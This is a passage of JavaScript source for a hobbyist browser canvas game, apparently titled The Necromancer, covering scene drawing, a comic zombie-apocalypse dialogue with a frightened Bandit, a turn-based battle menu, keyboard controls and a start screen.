             document.body.style.backgroundColor = "#000714";
             moon(20, 20);
         }

         function drawMap2() {
             playerX = 300;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#000714";
             for (var x = 0; x < borderD; x += Math.round(Math.random() * 45)) {
                 for (var y = 0; y < borderW; y += Math.round(Math.random() * 45)) {
                     star(x, y);
                 }
             }
         }

         function drawMap3() {
             addAMemory("The Bandit said something about the zombie apocalypse");
             addAMemory("The Bandit ran away from thinking you were a zombie");
             addAMemory("The Bandit said he was on guard do");
             playerX = 300;
             playerY = 340;
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#000710";
             Campfire(500, 300);
             drawBanditFacingRight();
             movement = false;
             Dialogue("Bandit: Dear Audio Diary,", 500, 3000, "blue");
             Dialogue("It's been a long time since I've seen any...living people...", 3000.0001, 6500, "blue");
             Dialogue("Maybe the rest were eaten...", 6500.0001, 10000, "blue");
             Dialogue("...", 10000.0001, 13500, "white");
             Dialogue("AWESOME!!!", 13500.0001, 17000.0001);
             Dialogue("I'll be on the front page of The Death Valley Times", 17000.0001, 20500, "blue");
             Dialogue("THE BANDIT SURVIVES ZOMBIE APOCALYPSE", 20500.0001, 24000, "blue");
             Dialogue("EVEN THE NECROMANCER CAN'T STOP HIM", 24000.0001, 27500, "blue");
             Dialogue("HE'S BEEN CROWNED KING OF UNIVERSE", 27500.0001, 30000, "blue");
             Dialogue("That'd be cool", 30000.0001, 33500);
             Dialogue("Whatever, I better get back on guard duty", 33500.0001, 37000, "blue");
             setTimeout(function() {
                 ctx.clearRect(banditX, banditY, 100, 100);
                 drawBanditFacingLeft();
                 Dialogue("...", 2500, 4000, "blue");
                 Dialogue("AHHH!!!", 4000.0001, 7500, "blue");
                 
                 setTimeout(function() {
                    setInterval(function() {
                         if (banditX < ctx.canvas.width-ctx.canvas.width/4 && scene === 3) {
                             banditX++;
                             ctx.clearRect(banditX - 10, banditY, 510, 500);
                             drawBanditFacingRight();
                         } else if (banditX >= ctx.canvas.width-ctx.canvas.width/4) {
                             ctx.clearRect(banditX, banditY, 200, 200);
                             movement = true;
                         }
                     }, 3000 / 60);
                 }, 7500.0001);
                 
                 Dialogue("A Z-Z-ZOMBIE!!!", 7500.0001, 10000, "blue");
                 Dialogue("NONONONONONONONONONONONONONO", 10000.0001, 13500, "blue");
                 Dialogue("I DON'T WANNA DIE!!!", 13500.0001, 17000, "blue");
  
             }, 37500);
         }

         function drawMap4() {
             ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#001a3d";
             playerX = 200;
             playerY = 340;
             banditX = 600;
             banditY = 300;
             drawBanditFacingLeftWithArmRaised();
             FlowerBush(350, 100);
         }
         
         function drawMap5() {
           ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
             document.body.style.backgroundColor = "#001a3d";
             playerX = 200;
             playerY = 340;
             banditX = 600;
             banditY = 320;
             drawProtagonistFacingRight();
             drawBanditFacingLeft();
             ctx.fillStyle = "#A17300";
             ctx.fillRect(0, 390, ctx.canvas.width, 700);
         }

         function option() {
             ctx.fillStyle = "white";
             ctx.font = "20px Arial";
             ctx.fillText("Attack", 1, 175);
             ctx.fillText("Eat", 1, 275);
             ctx.fillText("Threaten", 1, 375);

             ctx.fillText("Run Away", 1200, 175);
             ctx.fillText("Talk", 1200, 275);
             ctx.fillText("Memories", 1200, 375);
         }
         //Draws the map for fighting enemies
         function drawBattleMap() {
             function showBattleScreen(text, x, y, color, font) {
                 ctx.fillStyle = color;
                 ctx.font = font;
                 ctx.fillText(text, x, y);
             }
             if (fighting == "Bandit") {
                 ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
                 document.body.style.backgroundColor = "black";
                 drawBanditBattleBackground();
                 var potato = document.getElementById("p1").innerHTML;
                 potato = "loading";
                 setTimeout(function() {
                   potato = "";
             Dialogue("Mysterious Voice: Hey it's me again",0, 3450, "purple");
             Dialogue("So I have to talk in stupid text because talking to you with a voice was really hard the first time, I had to put a lot of effort into it", 3450.00001, 13450, "purple");
               Dialogue("I'll be here to help you out as much as I can", 13500.0001, 20000, "purple");
             Dialogue("Look for my dialogue color, it will always be purple", 20000.0001, 24500, "purple");
             Dialogue("Don't judge me, all the good dialogue colors were taken", 24500.0001, 28500, "purple");
             addAMemory("The Mysterious Voice can break the 4th wall");
             Dialogue("Any how I'll send a prompt to ask if you want me to explain how to fight", 28500.0001, 31300, "purple");
             setTimeout(function(){
               var wannaKnowHowToFight = prompt("Would you like a tutorial on how to fight");
             if(wannaKnowHowToFight.toLowerCase() === "yes"){
               Dialogue("Mysterious Voice: Alrighty then!", 0, 2000, "purple");
               Dialogue("First, let me explain what the fight options all mean", 2000.0001, 5000, "purple");
               Dialogue("Attack is self explanatory, do damage to the enemy", 5000.0001, 9000, "purple");
               Dialogue("You don't know how to dodge attacks yet so just be careful when attacking, the enemy can attack too!", 9000.0001, 15000, "purple");
               Dialogue("Next is eat, you can eat food when you have any to heal and get power ups", 15000.0001, 20000, "purple");
               Dialogue("If you threaten the enemy, you might scare them into giving up, but it could also enrage them so make sure you know a lot about the enemy", 20000.0001, 30000, "purple");
               Dialogue("Running away doesn't always work, and you might even trip and take damage!", 30000.0001, 37000, "purple");
               Dialogue("If you talk, you try to reason with the enemy, and talk your way out of the fight", 37000.0001, 42000, "purple");
               Dialogue("Finally and in my opinion most importantly, memories", 42000.0001, 46000, "purple");
               Dialogue("This is everything you have learned, and I'm not talking about instructions on how to move and stuff", 46000.0001, 55500, "purple");
               Dialogue("It's everything that's happened, what people think of you, who is your friend and who's your enemy, etc. what you can remember", 55500.0001, 62500, "purple");
               Dialogue("It's a way to rebuild your memory, beause of your amnesia and all", 62500.0001, 66500, "purple");
               Dialogue("Ok, let's begin the battle!", 66500.0001, 69500, "purple");
               setTimeout(function(){
                 canAttack = true;
               }, 69500);
             } else if(wannaKnowHowToFight.toLowerCase() === "no"){
               Dialogue("If you insist, take on Bandit!", 0, 3000);
               setTimeout(function(){
                 canAttack = true;
               }, 3000);
             } else {
               Dialogue("You didn't type in yes or no, so I'll just explain the rules anyway", 0, 2000);
               Dialogue("First, let me explain what the fight options all mean", 2000.0001, 5000, "purple");
               Dialogue("Attack is self explanatory, do damage to the enemy", 5000.0001, 9000, "purple");
               Dialogue("You don't know how to dodge attacks yet so just be careful when attacking, the enemy can attack too!", 9000.0001, 15000, "purple");
               Dialogue("Next is eat, you can eat food when you have any to heal and get power ups", 15000.0001, 20000, "purple");
               Dialogue("If you threaten the enemy, you might scare them into giving up, but it could also enrage them so make sure you know a lot about the enemy", 20000.0001, 30000, "purple");
               Dialogue("Running away doesn't always work, and you might even trip and take damage!", 30000.0001, 37000, "purple");
               Dialogue("If you talk, you try to reason with the enemy, and talk your way out of the fight", 37000.0001, 42000, "purple");
               Dialogue("Finally and in my opinion most importantly, memories", 42000.0001, 46000, "purple");
               Dialogue("This is everything you have learned, and I'm not talking about instructions on how to move and stuff", 46000.0001, 55500, "purple");
               Dialogue("It's everything that's happened, what people think of you, who is your friend and who's your enemy, etc. what you can remember", 55500.0001, 62500, "purple");
               Dialogue("It's a way to rebuild your mmemory, beause of your amnesia and all", 62500.0001, 66500, "purple");
               setTimeout(function(){
                 canAttack = true;
               }, 66500);
             }
             }, 31300.001);

                     column = 1;
                     row = 1;
                     showBattleScreen("", 100, 600, "black", "40px Arial");
                     playerX = 200;
                     playerY = 370;
                     banditX = 600;
                     banditY = 350;
                     drawProtagonistFacingRight();
                     drawBanditFacingLeftWithArmRaised();
                     potato = "";

                     ctx.strokeStyle = "white";
                     ctx.fillStyle = "black";
                     ctx.strokeRect(1, 100, 100, 517);
                     ctx.fillRect(1, 100, 100, 517);

                     ctx.strokeRect(1200, 100, 100, 517);
                     ctx.fillRect(1200, 100, 100, 517);
                     
                     ctx.strokeRect(0, 0, 1300, 100);
                      ctx.fillStyle = "white";
                      ctx.font = "50px Arial";
                     ctx.fillText("Player Health: " + playerHealth + "                  Bandit's Health: " + banditHealth, 100, 50);

                     option();
                 }, 550);
             }
         }
         //If the scene number is equal to a specific number, draw a specific map.
         function checkMap() {
             if (scene == 1) {
                 drawMap1();
             } else if (scene == 2) {
                 drawMap2();
             } else if (scene == 3) {
                 drawMap3();
             } else if (scene == 4) {
                 drawMap4();
             } else if (scene == 5){
               drawMap5();
             }
             
         }
         
          //Attacks of you and zee enemies               
         function Attack(){
          canAttack = false;
           option();
           banditHealth -= playerDamage;
           ctx.clearRect(1, 1, 1250, 75);
           ctx.font = "50px Arial";
           ctx.fillText("Player Health: " +  playerHealth + "                 Bandit's Health: " + banditHealth, 100, 50); 
           
           if(fighting === "Bandit"){
            if(attackNumber === 1){
              ctx.font = "20px Arial";
              Dialogue("Prepare to die, evil zombie", 0, 4000, "blue");
              setTimeout(function(){
                
              setInterval(function() {
                         bulletX--;
                         ctx.clearRect(bulletX + 8 , bulletY, 40, 16);
                           drawProtagonistFacingRight();
                         drawBullet();
                     }, 100 / 65);
                     Dialogue("Bandit: Danget, I missed the zombie!", 5000, 8000, "blue");
                     Dialogue("And I broke the fight screen!", 8001, 11000, "blue");
                     Dialogue("Thank God he's not threatening me", 11000.0001, 14750);
                    addAMemory("Bandit can break the 4th wall");
                    Dialogue("That would be terrifying!", 14750.0001, 16750, "blue");
                    Dialogue("Well, I won't miss again, if that thing in front of me attacks again, I'll kil it instantly", 14750.0001, 19000, "blue");
             setTimeout(function(){
              canAttack = true;
              }, 19000);
               
              }, 4001);
            } else if(attackNumber === 2){
              ctx.font = "20px Arial";
              bulletX--;
             ctx.clearRect(bulletX + 8 , bulletY, 40, 16);
               drawBullet();
              Dialogue("DIE EVIL ZOMBIE!!!", 0, 2000, "blue");
              Dialogue("Bandit shot you", 2000.0001, 4000, "blue");
             setTimeout(function(){
              canAttack = true;
             }, 4000);
              setTimeout(function(){
              playerHealth = 0;
              drawProtagonistFacingRight();
              }, 5001);
            }
           }
           
         }
         
         //Eat some deliecious yummy F00D
         function Eat(){
          canAttack = false;
           if(fighting == "Bandit"){
               Dialogue("Mysterious Voice:You don't have any food to eat!", 0, 2800, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 2800);
         }
         }
         
         //Threaten the enemy
         function Threaten(){
          canAttack = false;
           if(fighting === "Bandit"){
               Dialogue("You: Boo!", 0, 1750, "white");
               Dialogue("Bandit: AAAAH!", 1751, 3750, "blue");
               Dialogue("You have won the battle by scaring Bandit!", 3750.0001, 7750, "purple");
               
               setTimeout(function(){
               fighting = "";
               scene = 5;
               canAttack = true;
               checkMap();
               }, 3750);
           }
         }
         
         //Run away from the enemy
         function RunAway(){
          canAttack = false;
          if(fighting === "Bandit"){
            if(runNum === 1){
            Dialogue("Mysterious Voice: You can't flee from bosses", 0, 3000, "purple");
            addAMemory("You can't flee from bosses");
            Dialogue("You might be mad you're fighitng a boss for you first fight, but he shouldn't be too hard to beat, he's terrified of you!", 3000.0001, 5350, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 5350);
            } else {
              Dialogue("Mysterious Voice: You still can't flee from bosses, silly!", 0, 4250, "purple");
            setTimeout(function(){
             canAttack = true;
            }, 4250);
            }
          } 
         }
         
         //Try to reason/talk to the enemy
         function Talk(){
          canAttack = false;
           if(fighting == "Bandit"){
             if(talkNumber === 1){
             Dialogue("You: I'm not a zombie", 0, 2850, "white");
             Dialogue("Bandit: AAAH, THE ZOMBIE ATE A BRAIN AND CAN TALK NOW!!!", 2850.0001, 5850, "blue");
             setTimeout(function(){
               canAttack = true;
             }, 5850);
           } else if(talkNumber === 2){
             Dialogue("You: LISTEN TO ME!", 0, 1800, "white");
             Dialogue("Bandit: Well I'm gonna die anyway, what do you have to say strange smart zombie?", 1800.0001, 5800, "blue");
             setTimeout(function(){
               canAttack = true;
             }, 5800);
             
           } else if(talkNumber === 3){
             Dialogue("Option 1: I'm not a zombie Option 2: Why do you keep running away from me? Option 3: Don't worry, I'm not here to kill you", 0, 6000, "white");
             Dialogue("Mysterious Voice: Type in 1, 2, or 3, type anything else and I'll just pick a random option for you", 6000.0001, 10000, "purple");
             setTimeout(function(){
               talkOptionBanditFight = prompt("Which option do you choose?");
              var talkOptionBanditFightOption = talkOptionBanditFight.toLowerCase().replace(".", "").replace(" ", "").replace("'", "").replace("?", "").replace(".", "");
             if(talkOptionBanditFightOption == 1 || talkOptionBanditFightOption == "one" || talkOptionBanditFightOption == "option1" || talkOptionBanditFightOption == "imnotazombie"){
               talkOptionBanditFight = 1;
               Dialogue("You: I'm not a zombie", 0, 3000, "white");
               Dialogue("Bandit: I really do want to believe you, but it's been so long since I've seen a human, prove it", 3000, 9000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 9000);
             } else if(talkOptionBanditFightOption == 2 || talkOptionBanditFightOption == "two" || talkOptionBanditFightOption == "option2" || talkOptionBanditFightOption == "whydoyoukeeprunningawayfromme"){
               talkOptionBanditFight = 2;
               Dialogue("You: Why do you keep running away from me", 0, 4000, "white");
               Dialogue("Bandit: Why are you following me?", 4000.0001, 7000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 7000);
             } else if(talkOptionBanditFightOption == 3 || talkOptionBanditFightOption == "three" || talkOptionBanditFightOption == "option3" || talkOptionBanditFightOption == "dontworryimnotheretokillyou"){
               talkOptionBanditFight = 3;
               Dialogue("You: Don't worry, I'm not here to kill you", 0, 2500, "white");
               Dialogue("Bandit: You're not here to kill me...", 2500.0001, 5000, "blue");
               Dialogue("YOUR HERE TO TURN ME INTO ONE OF YOU!!!", 5000.0001, 7500, "blue");
               Dialogue("NEEEEEEVEEEEEER!!!!!", 7500.0001, 10000.0001, "blue");
               Dialogue("Bandit killed you", 10000, 12000, "purple");
               playerHealth = 0;
               drawProtagonistFacingRight();
             }  else {
               var randomNumber = Math.floor((Math.random() * 3) + 1);
               if(randomNumber === 1){
               talkOptionBanditFight = 1;
               Dialogue("You: I'm not a zombie", 0, 3000, "white");
               Dialogue("Bandit: I really do want to believe you, but it's been so long since I've seen a human, prove it", 3000, 9000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 9000);
             } else if(randomNumber === 2){
               talkOptionBanditFight = 2;
               Dialogue("You: Why do you keep running away from me", 0, 4000, "white");
               Dialogue("Bandit: Why are you following me?", 4000.0001, 7000, "blue");
               setTimeout(function(){
                 canAttack = true;
               }, 7000);
             } else if(randomNumber === 3){
               talkOptionBanditFight = 3;
               Dialogue("You: Don't worry, I'm not here to kill you", 0, 2500, "white");
               Dialogue("Bandit: You're not here to kill me...", 2500.0001, 5000, "blue");
               Dialogue("YOUR HERE TO TURN ME INTO ONE OF YOU!!!", 5000.0001, 7500, "blue");
               Dialogue("NEEEEEEVEEEEEER!!!!!", 7500.0001, 10000.0001, "blue");
               Dialogue("Bandit killed you", 10000, 12000, "purple");
               playerHealth = 0;
               drawProtagonistFacingRight();
              setTimeout(function(){
               canAttack = true;
              }, 12000);
             } 
             }
               }, 10000);
         } else if(talkNumber === 4){
           if(talkOptionBanditFight === 1){
             Dialogue("You: How?", 0, 1200, "white");
             Dialogue("Bandit: With...", 1200.0001, 2900, "blue");
             Dialogue("A...", 2900.0001, 4900, "blue");
             Dialogue("DAAAAAAAANCE BAAAAAAAAAAATTLLLLLE!!!", 4900.001, 9900, "blue");
              setTimeout(function(){
               canAttack = true;
              }, 9900);
           } else if(talkOptionBanditFight === 2){
             Dialogue("You: I don't remmeber anything and you were the first person I bumped into", 0, 4100, "white");
             Dialogue("Bandit: So I'm like your brother now?", 4100.0001, 7000, "blue");
              setTimeout(function(){
               canAttack = true;
              }, 7000);
           }
         } else if(talkNumber === 5){
           if(talkOptionBanditFight === 1){
            Dialogue("Mysterious Voice: Wut", 0, 2000, "purple");
            Dialogue("You: Wut", 2000.0001, 3500, "white");
            Dialogue("YEP!!! AAAAAAAAAAARRRRRRRE", 3500.0001, 6000, "blue");
            Dialogue("YOOOOOOOOOOOOUUUU", 6000.0001, 8000, "blue");
            Dialogue("REEEAAAAAAADYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 8000.0001, 13000, "blue");
            
              setTimeout(function(){
               canAttack = true;
              }, 3500);
           } else if(talkOptionBanditFight === 2){
            Dialogue("Mysterious Voice: Talk Options: 1. YAAAS 2. Nope", 0, 5000, "purple");
            var bros = prompt("Are we bros?");
              setTimeout(function(){
               canAttack = true;
              }, 5000);
            bros = bros.toLowerCase();
            if(bros == 1 || bros == "1." || bros == "yes" || bros== "yeah" || bros == "yas" || bros == "yaas" || bros == "yaaas" || bros == "yaaaas" || bros == "yaaaaas"){
             Dialogue("Awesome! After my real brother disapeered I always wante", 0, 3200, "blue");
             Dialogue("Never mind that's a story for another day", 3200.0001, 3500, "blue");
             Dialogue("You defeated bandit by becoming bros with him!", 3500.0001, 3800, "purple");
              setTimeout(function(){
               canAttack = true;
              }, 3200);
            }
           }
          
         }
           }
        }
        
         //Check what you remember
         function Memories(){
          canAttack = false;
            if(memoryNumber === 1){
              Dialogue("This is everything that you have learned so far, if you didn't have enough time to read it, press memories again: " + memories, 0, 10000, "purple");
             setTimeout(function(){
              canAttack = true;
             }, 10000);
           } else {
             Dialogue("What you know so far: " + memories, 0, 5000, "white");
            setTimeout(function(){
             canAttack = true;
            }, 5000);
           }
         }

         //Creates the rectangle on the selected option
         function drawOptionRectangle() {
             ctx.strokeStyle = "white";
             if (column === 1) {
                 if (row === 1) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 155, 100, 35);
                 } else if (row === 2) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 255, 100, 35);
                 } else if (row === 3) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1, 355, 100, 35);
                 }

             } else if (column === 2) {
                 if (row === 1) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 155, 100, 35);
                 } else if (row === 2) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 255, 100, 35);
                 } else if (row === 3) {
                     ctx.clearRect(1, 150, 100, 315);
                     ctx.clearRect(1200, 150, 100, 315);
                     ctx.strokeRect(1200, 355, 100, 35);
                 }
             }
         }
         //Checks to see if device is mobile
         var isMobile = {
             Android: function() {
                 return navigator.userAgent.match(/Android/i);
             },
             BlackBerry: function() {
                 return navigator.userAgent.match(/BlackBerry/i);
             },
             iOS: function() {
                 return navigator.userAgent.match(/iPhone|iPad|iPod/i);
             },
             Opera: function() {
                 return navigator.userAgent.match(/Opera Mini/i);
             },
             Windows: function() {
                 return navigator.userAgent.match(/IEMobile/i);
             },
             any: function() {
                 return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
             }
         };
         //Adds movement to game if movement buttons are pressed whether the device is mobile or not
         document.addEventListener('keydown', function(e) {
             if (e.key === 'w' && playerY >= borderW && movement === true && scene !== 4 || e.keyCode === 38 && playerY >= borderW && movement === true && scene !== 4) {
                 playerY -= playerSpeed;
                 ctx.clearRect(playerX - 5, playerY - 15, 95, 95);
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 drawProtagonistFacingUp();
             }
             if (e.key == 'd' && playerX < borderD && movement === true || e.keyCode === 39 && playerX < borderD && movement === true) {
                 if (playerX > borderD - 20) {
                     scene++;
                     checkMap();
                 }
                 if (scene < 0) {
                     scene++;
                 }
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                     if (playerX > banditX - 135) {
                         movement = false;
                         if (playerX > banditX - 135) {
                             Dialogue("Bandit: Oh no it's YOU!!!", 0, 2000, "blue");
                             Dialogue("I WON'T LET YOU END THE WORLD", 2000.0001, 4670, "blue");
                             Dialogue("YOU EVIL DEAD SCUM!!!", 4670.0001, 6670, "blue");
                             battleDialogue("FIGHT MEEEEEEE!!", 6670.0001, 10370, "blue");
                         }
                     }
                 }
                 playerX += playerSpeed;
                 ctx.clearRect(playerX - 30, playerY - 15, 100, 100);
                 drawProtagonistFacingRight();
             }
             if (e.key == 's' && playerY < borderS && movement === true && scene !== 4 || e.keyCode === 40 && playerY < borderS && movement === true && scene !== 4) {
                 playerY += playerSpeed;
                 ctx.clearRect(playerX - 10, playerY - 30, 100, 100);
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 drawProtagonistFacingDown();
             }
             if (e.key == 'a' && playerX > borderA && movement === true || e.keyCode === 37 && playerX > borderA && movement === true) {
                 if (playerX < borderA + 20 && scene !== 1 && scene !== 4) {
                     scene--;
                     checkMap();
                 }
                 if (scene == 3) {
                     Campfire(500, 300);
                 } else if (scene == 4) {
                     FlowerBush(350, 100);
                 }
                 if (scene < 0) {
                     scene++;
                 }
                 playerX -= playerSpeed;
                 ctx.clearRect(playerX - 10, playerY - 5, 100, 100);
                 drawProtagonistFacingLeft();
             }

             //A ton of code for selecting options, and there's more of it above.
             if (e.keyCode == 38 && fighting !== "") {
                 row--;
                 if (row <= 0) {
                     row = 3;
                 }
                 drawOptionRectangle();
                 option();
             } else if (e.keyCode == 40 && fighting !== "" && canAttack === true) {
                 row++;
                 if (row >= 4) {
                     row = 1;
                 }
                 drawOptionRectangle();
                 option();

             } else if (e.keyCode == 39 && fighting !== "" && canAttack === true) {
                 column++;
                 if (column >= 3) {
                     column = 1;
                 }
                 drawOptionRectangle();
                 option();
             } else if (e.keyCode == 37 && fighting !== "" && canAttack === true) {
                 column--;
                 if (column <= 0) {
                     column = 2;
                 }
                 drawOptionRectangle();
                 option();
             }
             
             //If space is pressed, an option is selected if fighting
             if(e.keyCode == 32 && fighting !== "" && canAttack === true){             
               if (column === 1) {
                 if (row === 1) {
                   attackNumber++;
                   Attack();
                 } else if (row === 2) {
                   eatNumber++;
                   Eat();
                 } else if (row === 3) {
                    threatNumber++;
                   Threaten();
                 }

             } else if (column === 2) {
                 if (row === 1) {
                   //I think the variable name for this was clever
                   runNum++;
                   RunAway();
                 } else if (row === 2) {
                   talkNumber++;
                   Talk();
                 } else if (row === 3) {
                   memoryNumber++;
                   Memories();
                 }
             }
             }


         });
     }
     //Start the startscreen
     function startScreen() {
         onGame = false;
         //function to literally start the game.
         function startGame(event) {
             var mouseX = event.clientX;
             var mouseY = event.clientY;
             if (mouseX > 50 && onGame === false) {
                 onGame = true;
                 game();
             }
             window.addEventListener('touchstart', function() {
               if(onGame === false){
                 game();
               }
             });
             
         }
         //If you click then the game starts
         setTimeout(function() {
             document.addEventListener("mousedown", startGame);
         }, 3000);

         //Clears out thne screen on the start screen
         ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
         document.body.style.backgroundColor = "white";
         var theNecromancer = new Image();
         theNecromancer.onload = function() {
             ctx.drawImage(theNecromancer, -100, 0);
         };
         theNecromancer.src = "Sprites/TheNecromancerLogo.png";
         var startButton = new Image();
         startButton.onload = function() {
             ctx.drawImage(startButton, 40, 300);
             var mouseX = event.clientX;
             var mouseY = event.clientY;
             if (mouseX > 0 && onGame === false) {
                 onGame = false;
                 game();
             }
         };
         
         startButton.src = "Sprites/StartButton.png";
         var loading = document.getElementById("loading");
         loading.innerHTML = "loading";
         setTimeout(function() {
             loading.innerHTML = "";
         }, 3000);
     }
     startScreen();
 };
